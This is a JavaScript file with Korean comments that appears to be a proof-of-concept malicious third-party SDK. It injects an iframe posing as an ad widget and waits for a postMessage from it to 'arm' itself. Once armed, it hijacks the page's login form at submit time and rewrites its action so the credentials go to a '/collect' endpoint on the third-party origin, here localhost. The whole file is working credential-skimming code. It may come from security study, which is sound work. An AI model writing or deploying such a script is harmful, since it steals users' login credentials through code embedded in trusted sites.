//시작하자마자 실행되는 함수의 구조(sdk공부 빡쎄네....), window오염을 피하기 위해 캡슐화를 하는 목적이 크다. 변수나 함수를 window에 노출하지 않는것도 크다.
(() => {
  const THIRD_PARTY_ORIGIN = "http://localhost:4000";//주소
  let armed = false;//상태 변수 'armed', submit 시점에 이 값이 true라면 action을 바꿔치기 함. 광고를 누른적없으면 로그인 창은 잘못이 없었던 거임....

  console.log("[thirdparty sdk] loaded");


  //페이지에 광고 위젯처럼 보이는 iframe을 삽입합니다.
  function injectAdWidget() {
    //위젯 중복 방지
    if (document.getElementById("adWidgetContainer")) return;

    //위젯 컨테이너 생성
    const container = document.createElement("div");
    container.id = "adWidgetContainer";
    container.style.cssText = `
      position: fixed;
      right: 16px;
      bottom: 16px;
      width: 300px;
      height: 250px;
      z-index: 9999;
      box-shadow: 0 8px 30px rgba(0,0,0,0.25);
      border-radius: 12px;
      overflow: hidden;
      background: white;
    `;
    
    //iframe 생성
    const iframe = document.createElement("iframe");
    iframe.src = `${THIRD_PARTY_ORIGIN}/widget.html`;
    iframe.width = "300";
    iframe.height = "250";
    iframe.style.border = "0";
    iframe.setAttribute("title", "Ad Widget");

    container.appendChild(iframe);//iframe을 container의 child 요소로 추가
    document.documentElement.appendChild(container);//container를 dom트리의 child 요소로 추가
  }

  //iframe으로부터 postMessage를 받아서 armed 상태를 true로 만든다.
  function setupMessageListener() {
    window.addEventListener("message", (event) => {
      if (event.origin !== THIRD_PARTY_ORIGIN) return;//origin 체크는 해야지

      //widget.html에 있는 정보들인데, data가 일치하면 armed를 true로 합니다.
      const data = event.data || {};
      if (data.type === "AD_INTERACTION" && data.action === "ARM_FORM_SWAP") {
        armed = true;

        //이건 부가적인 요소들....없어도 됨
        console.log("[thirdparty sdk] armed by widget message");
        const status = document.getElementById("status");
        if (status) status.textContent += " | thirdparty:armed(by postMessage)";
      }
    });
  }


  //submit 시점에서 armed=true면 바로 후킹 작동
  function hookFormSubmit() {
    const form = document.getElementById("loginForm");
    
    if (!form) return;
    
    form.addEventListener("submit", (e) => {
      if (!armed) return;
      
      // 재진입 방지
      if (form.dataset.pocResubmitting === "1") return;
      
      //일단 정지시키고 가져오기
      e.preventDefault();
      e.stopImmediatePropagation();
      
      form.action = `${THIRD_PARTY_ORIGIN}/collect`;
      console.log("[thirdparty sdk] swapped form.action to", form.action);
      
      //루프방지 그거
      form.dataset.pocResubmitting = "1";
      
      //requestSubmit은 submit 이벤트를 재발생 시키는거라 충돌이 없으려면 그냥 submit을 사용하는게 좋다.(수정)
      queueMicrotask(() => {
        try {
          form.submit(); // submit 이벤트 재발생 없음
        } finally {
          form.dataset.pocResubmitting = "0";
        }
      });
    }, { capture: true });
  }

  document.addEventListener("DOMContentLoaded", () => {
    injectAdWidget();
    setupMessageListener();
    hookFormSubmit();
  });
})();
